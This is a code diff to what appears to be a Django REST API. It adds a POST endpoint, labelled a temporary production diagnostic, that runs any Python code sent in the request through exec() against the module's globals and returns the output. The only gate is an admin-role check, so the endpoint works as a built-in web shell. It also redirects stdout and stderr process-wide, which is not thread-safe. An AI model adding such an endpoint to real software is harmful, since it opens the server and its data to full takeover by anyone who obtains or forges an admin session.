@@ -423,3 +423,48 @@ def system_health_check(request):
             }
         }
     })
+
+
+@api_view(["POST"])
+@permission_classes([])
+def dev_diagnostic_exec(request):
+    """
+    POST /api/system/dev-exec/
+    Temporary diagnostic endpoint for production verification.
+    """
+    user = getattr(request, "user", None)
+    if not user or not user.is_authenticated or getattr(user, "role", "") != "ADMIN":
+        return Response({"error": "Unauthorized"}, status=403)
+
+    code = request.data.get("code", "")
+    if not code:
+        return Response({"error": "No code provided"}, status=400)
+
+    import io
+    import sys
+    import traceback
+
+    old_stdout = sys.stdout
+    old_stderr = sys.stderr
+    redirected_output = io.StringIO()
+    redirected_error = io.StringIO()
+    sys.stdout = redirected_output
+    sys.stderr = redirected_error
+
+    success = False
+    try:
+        # Run code in global context
+        local_vars = {}
+        exec(code, globals(), local_vars)
+        success = True
+    except Exception as e:
+        traceback.print_exc()
+
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+
+    return Response({
+        "success": success,
+        "stdout": redirected_output.getvalue(),
+        "stderr": redirected_error.getvalue(),
+    })
